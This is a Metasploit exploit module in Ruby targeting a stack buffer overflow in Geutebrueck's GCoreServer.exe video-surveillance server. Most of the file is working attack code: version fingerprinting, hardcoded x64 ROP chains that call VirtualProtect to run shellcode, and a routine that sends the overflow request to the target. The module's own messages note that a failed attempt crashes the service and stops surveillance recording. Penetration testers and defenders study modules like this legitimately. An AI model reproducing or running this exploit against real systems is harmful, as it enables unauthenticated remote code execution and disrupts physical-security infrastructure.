##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'nokogiri'
require 'open-uri'

class MetasploitModule < Msf::Exploit::Remote
    include Msf::Exploit::Remote::Tcp

    Rank = NormalRanking

    def initialize(info = {})
        super(update_info(info,
                          'Name'		   => 'Geutebrueck GCore - GCoreServer.exe Buffer Overflow RCE',
                          'Description'	=> 'This module exploits a stack Buffer Overflow in the GCore server (GCoreServer.exe). The vulnerable webserver is running on Port 13003 and Port 13004, does not require authentication and affects all versions from 2003 till July 2016 (Version 1.4.YYYYY).',
                          'License'		=> MSF_LICENSE,
                          'Author'		 =>
                          [
                              'Luca Cappiello',
                              'Maurice Popp'

                          ],
                          'References'	 =>
                          [
                              ['www.geutebrueck.com', '']
                          ],
                          'Platform'	   => 'win',
                          'Targets'		=>
                          [
                              ['Automatic Targeting', { 'auto' => true, 'Arch' => ARCH_X86_64 }],
                              ['GCore 1.3.8.42, Windows x64 (Win7, Win8/8.1, Win2012R2,...)', { 'Arch' => ARCH_X86_64 }],
                              ['GCore 1.4.2.37, Windows x64 (Win7, Win8/8.1, Win2012R2,...)', { 'Arch' => ARCH_X86_64 }]
                          ],
                          'Payload'		=>
                          {
                              'Space' => '2000'
                          },
                          'Privileged'	 => false,
                          'DisclosureDate' => 'Sep 01 2016',
                          'DefaultTarget'  => 0))
    end

    def fingerprint
        print_status('Trying to fingerprint server with http://' + datastore['RHOST'] + ':' + datastore['RPORT'].to_s + '/statistics/runningmoduleslist.xml...')
        @doc = Nokogiri::XML(open('http://' + datastore['RHOST'] + ':' + datastore['RPORT'].to_s + '/statistics/runningmoduleslist.xml'))
        statistics = @doc.css('modulestate')
        statistics.each do |x|
            if (x.to_s.include? 'GCoreServer') && (x.to_s.include? '1.3.8.42')
                mytarget = targets[1]
                # print_status(mytarget.name)
                print_status("Vulnerable version detected: #{mytarget.name}")
                return Exploit::CheckCode::Appears, mytarget
            elsif (x.to_s.include? 'GCoreServer') && (x.to_s.include? '1.4.2.37')
                mytarget = targets[2]
                # print_status(mytarget.name)
                print_status("Vulnerable version detected: #{mytarget.name}")
                return Exploit::CheckCode::Appears, mytarget
                end
        end
        print_status('Statistics Page under http://' + datastore['RHOST'] + ':' + datastore['RPORT'].to_s + '/statistics/runningmoduleslist.xml is not available.')
        print_status("Make sure that you know the exact version, otherwise you'll knock out the service.")
        print_status('In the default configuration the service will restart after 1 minute and after the third crash the server will reboot!')
        print_status('After a crash, the videosurveillance system can not recover properly and stops recording.')
        [Exploit::CheckCode::Unknown, nil]
    end

    def check
        fingerprint
    end

    def ropchain(target)
        if target.name.include? '1.3.8.42'
            print_status('Preparing ROP chain for target 1.3.8.42!')

            # 0x140cd00a9 | add rsp, 0x10 ; ret
            # This is needed because the next 16 bytes are sometimes messed up.
            overwrite = [0x140cd00a9].pack('Q<')

            # These bytes "\x43" are sacrificed ; we align the stack to jump over this messed up crap.
            stack_align = "\x43" * 16

            # We have 40 bytes left to align our stack!
            # The most reliable way to align our stack is to save the value of rsp in another register, do some calculations
            # and to restore it.
            # We save RSP to RDX. Even if we use ESP/EDX registers in the instruction, it still works because the values are small enough.

            # 0x1404e5cbf: mov edx, esp ; ret
            stack_align += [0x1404e5cbf].pack('Q<')

            # As no useful "sub rdx, xxx" or "sub rsp, xxx" gadget were found, we use the add instruction with a negative value.
            # We pop -XXXXX as \xxxxxxxxx to rax
            # 0x14013db94  pop rax ; ret
            stack_align += [0x14013db94].pack('Q<')
            stack_align += [0xFFFFFFFFFFFFF061].pack('Q<')

            # Our value is enough.
            # 0x1407dc547  | add rax,rdx ; ret
            stack_align += [0x1407dc547].pack('Q<')

            # RSP gets restored with the new value. The return instruction doesn't break our ropchain and continues -XXXXX back.
            # 0x140ce9ac0 | mov rsp, rax ; ..... ; ret
            stack_align += [0x140ce9ac0].pack('Q<')

            # Virtualprotect Call for 64 Bit calling convention. Needs RCX, RDX, R8 and R9.
            # We want RCX to hold the value for VP Argument "Address of Shellcode"
            # 0x140cc2234 |  mov rcx, rax ; mov rax, qword [rcx+0x00000108] ; add rsp, 0x28 ; ret  ;
            rop = ''
            rop += [0x140cc2234].pack('Q<')
            rop += [0x4141414141414141].pack('Q<') * 5 # needed because of the stack aliging with "add rsp, 0x28" ;
            # 0x1400ae2ae    | POP RDX; RETN
            # 0x...1000        | Value for VP "Size of Memory"
            rop += [0x1400ae2ae].pack('Q<')
            rop += [0x0000000000000400].pack('Q<')

            # 0x14029dc6e:   | POP R8; RET
            # 0x...40                | Value for VP "Execute Permissions"
            rop += [0x14029dc6e].pack('Q<')
            rop += [0x0000000000000040].pack('Q<')

            # 0x1400aa030    | POP R9; RET
            # 0x...            | Value for VP "Writeable location". Not sure if needed?
            # 0x1409AE1A8 is the .data section of gcore; let's test with this writable section...
            rop += [0x1400aa030].pack('Q<')
            rop += [0x1409AE1A8].pack('Q<')

            # 0x140b5927a: xor rax, rax ; et
            rop += [0x140b5927a].pack('Q<')

            # 0x1402ce220 pop rax ; ret
            # 0x140d752b8 | VP Stub IAT Entry
            rop += [0x1402ce220].pack('Q<')
            rop += [0x140d752b8].pack('Q<')

            # 0x1407c6b3b mov rax, qword [rax] ; ret  ;
            rop += [0x1407c6b3b].pack('Q<')

            # 0x140989c41 push rax; ret
            rop += [0x140989c41].pack('Q<')

            # 0x1406d684d jmp rsp
            rop += [0x1406d684d].pack('Q<')

            [rop, overwrite, stack_align]

        elsif target.name.include? '1.4.2.37'
            print_status('Preparing ROP chain for target 1.4.2.37!')

            # 0x140cd9759 | add rsp, 0x10 ; ret
            # This is needed because the next 16 bytes are sometimes messed up.
            overwrite = [0x140cd9759].pack('Q<')

            # These bytes "\x43" are sacrificed ; we align the stack to jump over this messed up crap.
            stack_align = "\x43" * 16

            # We have 40 bytes left to align our stack!
            # The most reliable way to align our stack is to save the value of rsp in another register, do some calculations
            # and to restore it.
            # We save RSP to RDX. Even if we use ESP/EDX registers in the instruction, it still works because the values are small enough.

            # 0x1404f213f: mov edx, esp ; ret
            stack_align += [0x1404f213f].pack('Q<')

            # As no useful "sub rdx, xxx" or "sub rsp, xxx" gadget were found, we use the add instruction with a negative value.
            # We pop -XXXXX as \xxxxxxxxx to rax
            # 0x14000efa8  pop rax ; ret
            stack_align += [0x14000efa8].pack('Q<')
            stack_align += [0xFFFFFFFFFFFFF061].pack('Q<')

            # Our value is enough.
            # 0x140cdfe65  | add rax,rdx ; ret
            stack_align += [0x140cdfe65].pack('Q<')

            # RSP gets restored with the new value. The return instruction doesn't break our ropchain and continues -XXXXX back.
            # 0x140cf3110 | mov rsp, rax ; ..... ; ret
            stack_align += [0x140cf3110].pack('Q<')

            # Virtualprotect Call for 64 Bit calling convention. Needs RCX, RDX, R8 and R9.
            # We want RCX to hold the value for VP Argument "Address of Shellcode"
            # 0x140ccb984 |  mov rcx, rax ; mov rax, qword [rcx+0x00000108] ; add rsp, 0x28 ; ret  ;
            rop = ''
            rop += [0x140ccb984].pack('Q<')
            rop += [0x4141414141414141].pack('Q<') * 5 # needed because of the stack aliging with "add rsp, 0x28" ;
            # 0x14008f7ec    | POP RDX; RETN
            # 0x...1000        | Value for VP "Size of Memory"
            rop += [0x14008f7ec].pack('Q<')
            rop += [0x0000000000000400].pack('Q<')

            # 0x140a88f81:   | POP R8; RET
            # 0x...40                | Value for VP "Execute Permissions"
            rop += [0x140a88f81].pack('Q<')
            rop += [0x0000000000000040].pack('Q<')

            # 0x1400aa030    | POP R9; RET
            # 0x...            | Value for VP "Writeable location". Not sure if needed?
            # 0x140FB5000 is the .data section of gcore; let's test with this writable section...
            rop += [0x1400aa030].pack('Q<')
            rop += [0x140FB5000].pack('Q<')

            # 0x140ccea2f: xor rax, rax ; et
            rop += [0x140ccea2f].pack('Q<')

            # 0x14000efa8 pop rax ; ret
            # 0x140d83268 | VP Stub IAT Entry #TODO!
            rop += [0x14000efa8].pack('Q<')
            rop += [0x140d83268].pack('Q<')

            # 0x14095b254 mov rax, qword [rax] ; ret  ;
            rop += [0x14095b254].pack('Q<')

            # 0x140166c46 push rax; ret
            rop += [0x140166c46].pack('Q<')

            # 0x140cfb98d jmp rsp
            rop += [0x140cfb98d].pack('Q<')

            [rop, overwrite, stack_align]

        else
            print_status('ROP chain for this version not (yet) available or the target is not vulnerable.')

        end
      end

    def exploit
        # mytarget = target
        if target['auto']
            checkcode, target = fingerprint
            if checkcode.to_s.include? 'unknown'
                print_status('No vulnerable Version detected - exploit aborted.')
            else
                target_rop, target_overwrite, target_stack_align = ropchain(target)
                begin
                    connect
                    print_status('Crafting Exploit...')

                    http_wannabe = 'GET /'
                    buffer_200 = "\x41" * 200
                    rop = target_rop
                    payload.encoded
                    buffer_1823 = "\x41" * 1823
                    overwrite = target_overwrite
                    stack_align = target_stack_align

                    exploit = http_wannabe + buffer_200 + rop + payload.encoded + buffer_1823 + overwrite + stack_align
                    print_status('Exploit ready for sending...')
                    sock.put(exploit, 'Timeout' => 20)
                    print_status('Exploit sent!')
                    # sleep(10)
                    buf = sock.get_once || ''
                rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
                    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
                ensure
                    print_status('Closing socket.')
                    disconnect
                    # sleep(10)
                end
            end

        else
            print_status('No auto detection - be sure to choose the right version! Otherwise the service will crash, the system reboots and leaves the surveillance software in an undefined status.')
            print_status("Selected version: #{self.target.name}")
            target_rop, target_overwrite, target_stack_align = ropchain(self.target)
            begin
                connect
                print_status('Crafting Exploit...')

                http_wannabe = 'GET /'
                buffer_200 = "\x41" * 200
                rop = target_rop
                payload.encoded
                buffer_1823 = "\x41" * 1823
                overwrite = target_overwrite
                stack_align = target_stack_align

                exploit = http_wannabe + buffer_200 + rop + payload.encoded + buffer_1823 + overwrite + stack_align
                print_status('Exploit ready for sending...')
                sock.put(exploit, 'Timeout' => 20)
                print_status('Exploit sent!')
                # sleep(10)
                buf = sock.get_once || ''
            rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
                elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
            ensure
                print_status('Closing socket.')
                disconnect
                # sleep(10)
            end

      end
    end
end
